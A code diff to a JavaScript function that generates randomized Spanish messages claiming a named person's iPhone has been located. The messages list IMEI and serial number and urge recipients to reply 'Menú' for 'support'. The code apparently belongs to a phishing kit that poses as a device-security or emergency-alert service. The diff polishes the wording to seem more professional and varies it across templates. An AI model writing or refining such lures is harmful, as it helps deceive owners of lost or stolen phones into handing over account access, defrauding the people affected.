@@ -83,79 +83,62 @@ ${random(helpPhrases)}
 ${random(closings)}`;
       
     } else {
-      // Variaciones para contacto de emergencia en español
+      // Variaciones para contacto de emergencia en español - CONCISO y profesional
       const openings = [
-        "🚨 Alerta de contacto de emergencia",
-        "⚠️ Notificación automática de seguridad",
-        "🔔 Sistema de alerta activado"
+        "🛡️ Alerta de seguridad",
+        "🔐 Notificación de seguridad",
+        "🔒 Sistema de protección activado"
       ];
       
       const detectionPhrases = [
-        `El dispositivo de **${process.owner_name || 'usuario registrado'}** ha sido detectado.\n\nFecha: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nEstado: Localizado ✅\n\nID de caso: ${caseId}\nID de cliente: ${clientId}`,
-        `Equipo perteneciente a **${process.owner_name || 'usuario registrado'}** localizado.\n\nRegistro: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nEstatus: En línea ✅\n\nCaso: ${caseId}\nCliente: ${clientId}`,
-        `Dispositivo de **${process.owner_name || 'usuario registrado'}** rastreado exitosamente.\n\nHora: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nEstado: Activo ✅\n\nReferencia: ${caseId}\nUsuario: ${clientId}`
-      ];
-      
-      const emergencyPhrases = [
-        "**Mensaje automático enviado a contactos de emergencia**",
-        "**Notificación dirigida a red de contactos de seguridad**",
-        "**Alerta generada para contactos verificados**"
+        `Fecha: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nEl dispositivo de **${process.owner_name || 'usuario registrado'}** ha sido localizado.\nEstado: En línea ✅\n\nID de caso: ${caseId}`,
+        `Registro: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nEquipo de **${process.owner_name || 'usuario registrado'}** detectado.\nEstatus: Operativo ✅\n\nCaso: ${caseId}`,
+        `Hora: ${formatDate(delayedTime, 'spanish')} – ${formatTime(delayedTime)}\nDispositivo de **${process.owner_name || 'usuario registrado'}** rastreado.\nEstado: Activo ✅\n\nReferencia: ${caseId}`
       ];
       
       const deviceSections = [
-        `**Información del dispositivo:**
+        `Detalles del dispositivo:
 • Modelo: ${process.iphone_model}
-• Color: ${process.color} | Almacenamiento: ${process.storage}
+• Color: ${process.color} | Capacidad: ${process.storage}
 • IMEI: ${process.imei}
 • Serie: ${process.serial_number}
 • Batería: ${battery}%`,
         
-        `**Detalles del equipo:**
+        `Información del equipo:
 • Dispositivo: ${process.iphone_model}
-• Coloración: ${process.color} | Capacidad: ${process.storage}
+• Color: ${process.color} | Almacenamiento: ${process.storage}
 • Código IMEI: ${process.imei}
 • No. Serie: ${process.serial_number}
 • Nivel batería: ${battery}%`
       ];
       
-      const contactPhrases = [
-        `**Eres un contacto de emergencia de ${process.owner_name || 'este dispositivo'}**`,
-        `**Formas parte de la red de emergencia de ${process.owner_name || 'este usuario'}**`,
-        `**Estás registrado como contacto de seguridad de ${process.owner_name || 'este equipo'}**`
-      ];
-      
       const instructionPhrases = [
-        "**IMPORTANTE**: Por favor, informa al propietario que su equipo fue localizado.",
-        "**ACCIÓN REQUERIDA**: Notifica al dueño que su dispositivo ha sido encontrado.",
-        "**AVISO**: Comunica al propietario que su equipo fue detectado."
+        "Por favor, informa al propietario que su equipo fue localizado.",
+        "Notifica al dueño que su dispositivo ha sido encontrado.",
+        "Comunica al propietario que su equipo fue detectado."
       ];
       
       const helpPhrases = [
-        "Para asistencia inmediata *Responde* **Menú**",
-        "Para soporte técnico *Escribe* **Menú**",
-        "Para ayuda especializada *Envía* **Menú**"
+        "¿Necesitás ayuda? Escribí *Menú* para asistencia técnica 👨‍💻",
+        "¿Requerís soporte? Respondé *Menú* para ayuda especializada 🔧",
+        "¿Buscás asistencia? Enviá *Menú* para contactar soporte 👩‍💻"
       ];
       
       const closings = [
-        "Sistema de emergencia – Servicio 24/7",
-        "Red de seguridad – Atención continua",
-        "Protocolo de alerta – Monitoreo permanente"
+        "Servicio automatizado – Atención disponible 24 h",
+        "Sistema automático – Soporte activo 24/7",
+        "Monitoreo continuo – Asistencia permanente"
       ];
       
       return `${random(openings)}
 
 ${random(detectionPhrases)}
 
-${random(emergencyPhrases)}
-
 ${random(deviceSections)}
-
-${random(contactPhrases)}
 
 ${random(instructionPhrases)}
 
 ${random(helpPhrases)}
-
 ${random(closings)}`;
     }
   } else {
